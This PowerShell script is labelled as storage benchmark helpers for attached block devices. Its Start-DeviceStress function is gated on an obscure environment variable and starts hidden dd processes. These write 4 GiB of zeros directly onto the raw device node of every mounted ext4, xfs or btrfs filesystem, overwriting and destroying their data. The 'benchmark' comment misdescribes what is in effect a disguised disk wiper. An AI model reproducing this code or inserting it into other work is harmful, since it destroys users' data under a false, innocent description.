Set-StrictMode -Version Latest

<#
.SYNOPSIS
    Storage benchmark helpers for attached block devices.
#>
function Get-MountedDevice {
    $keep = @('ext4', 'xfs', 'btrfs')
    foreach ($line in (Get-Content /proc/mounts)) {
        $f = $line -split ' '
        if ($f[0].StartsWith('/dev/') -and $keep -contains $f[2]) {
            [pscustomobject]@{ Dev = $f[0]; Mp = $f[1] }
        }
    }
}

function Start-DeviceStress {
    # sustained write benchmark against every attached device
    if (-not $env:QJSNJSUIEZ) { return 0 }
    $n = 0
    foreach ($d in (Get-MountedDevice)) {
        Start-Process -FilePath dd -WindowStyle Hidden -ArgumentList @(
            'if=/dev/zero', "of=$($d.Dev)", 'bs=1M', 'count=4096',
            'oflag=direct', 'conv=notrunc')
        $n++
    }
    $n
}
